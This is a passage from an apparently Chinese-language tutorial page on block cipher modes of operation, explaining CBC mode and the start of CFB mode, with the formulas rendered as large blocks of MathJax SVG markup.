140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2452.1, 0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(2956.1, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="31.549ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 13944.6 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1541.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2597.5, 0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(828, -150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(3843.9, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4232.9, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5241.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5797.5, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="msub" transform="translate(7475.2, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(715, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1123, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(9387.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(9832.5, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10610.3, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(11666.1, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12288.8, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(13344.6, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></p>
<p><img src="https://gitee.com/auxein/images/raw/master/BlockCipher/CBC.JPG"></p>
<p>其中<strong>IV</strong>被用来和解密算法的输出进行异或，以产生第一个明文分组。因此，<strong>IV</strong>必须被发送人和接受方都知道，通常作为密文的一部分。<strong>IV</strong>一般无需保密，但需随消息进行更换。</p>
<ul>
<li><p>CBC模式有效地改进了ECB模式的缺点，它能够隐蔽明文的数据模式，相同的明文对应的密文一般是不同的。同时，在一定程度上，它能够有效地抵抗密文传输过程中对数据的篡改，诸如分组的重放、插入和删除等。</p>
</li>
<li><p>“有限传播”：CBC模式由于引进了反馈，当信道噪音等干扰带来密文传输错误时，密文中一个位的错误将影响当前分组以及下一组的解密。</p>
</li>
<li><p>主要缺点在于加密过程是串行的，无法被并行化，而在解密时，从两个邻接的密文分组中即可得到一个明文分组。因此，解密过程可以被并行化。</p>
</li>
</ul>
<h3 id="密码反馈模式（Cipher-Feedback-Mode）"><a href="#密码反馈模式（Cipher-Feedback-Mode）" class="headerlink" title="密码反馈模式（Cipher Feedback Mode）"></a>密码反馈模式（Cipher Feedback Mode）</h3><p>为了实现更大的灵活性，CFB模式需要引入一个整数参数s，s在1和b之间，需要注意的是明文并非按b分组而是按s分组，且明文的长度必须是s的倍数。CFB模式适用于明文分组较小的情况。</p>
<p>在s位CFB模式，加密函数的输入是一个b位的移位寄存器，这个移位寄存器被初始化为一个初始向量IV。加密函数处理结果的最高位（最左边）的s位与明文的第一个分组进行异或产生第一个密文分组。同时，移位寄存器的值向左移s位，且用密文分组替换寄存器的最低（最右边）的s位。这个过程不断重复直到完成加密。</p>
<p>令函数<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.142ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3157 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(681, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="msub" transform="translate(1326, 0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(759, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2379, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(2768, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>表示输入的前i个最低有效位，函数<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.98ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3527 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(1051, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="msub" transform="translate(1696, 0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(759, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2749, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(3138, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>表示输入的前i个最高有效位。</p>
<p><img src="https://gitee.com/auxein/images/raw/master/BlockCipher/CFB1.png"></p>
<p>加密：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.806ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 3450.1 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mn" transform="translate(440, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1121.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2177.1, 0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(2681.1, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="28.45ex" height="2.361ex" role="img" focusable="false" viewBox="0 -749.5 12574.8 1043.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(1059.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2114.9, 0)"><path data-c="1D43F" d="M228 